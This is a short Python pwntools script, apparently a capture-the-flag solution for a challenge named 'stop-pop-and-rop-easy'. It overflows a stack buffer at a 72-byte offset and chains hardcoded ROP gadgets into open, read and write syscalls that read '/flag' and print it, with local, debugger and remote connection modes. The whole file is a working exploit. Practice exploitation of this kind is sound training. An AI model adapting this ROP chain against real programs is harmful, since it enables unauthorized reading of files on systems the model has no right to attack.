#!/usr/bin/env python3

from pwn import *

exe = ELF("/challenge/stop-pop-and-rop-easy")

context.binary = exe

gdb_script = """
b *challenge+394
c
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdb_script)
    else:
        r = remote("addr", 1337)

    return r

ret_gadget = 0x40101a
offset = 72
pop_rdi = 0x401ba4
pop_rsi = 0x401b9c
pop_rdx = 0x401bad
pop_rax = 0x401b8c
syscall = 0x401b84
flag = b'/flag\x00'
    
def main():
    r = conn()
    r.recvuntil(b'You can use gadgets that shift the stack appropriately to avoid that.\n')
    data = r.recvline().decode().strip()
    buff = int(data.split(': ')[1].rstrip('.'), 16)
    log.info(f"Buffer address: {hex(buff)}")
    # good luck pwning :)
    payload = flat(
        flag,
        cyclic(offset-len(flag)),
        ret_gadget,
        # first we open the file
        pop_rax, 2,
        pop_rdi, buff,
        pop_rsi, 0,
        pop_rdx, 0,
        syscall,
        # then we read the file
        pop_rax, 0,
        pop_rdi, 3,
        pop_rsi, buff,
        pop_rdx, 100,
        syscall,
        # finally we write to stdout
        pop_rax, 1,
        pop_rdi, 1,
        pop_rsi, buff,
        pop_rdx, 100,
        syscall
        
    )
    r.send(payload)
    r.interactive()


if __name__ == "__main__":
    main()
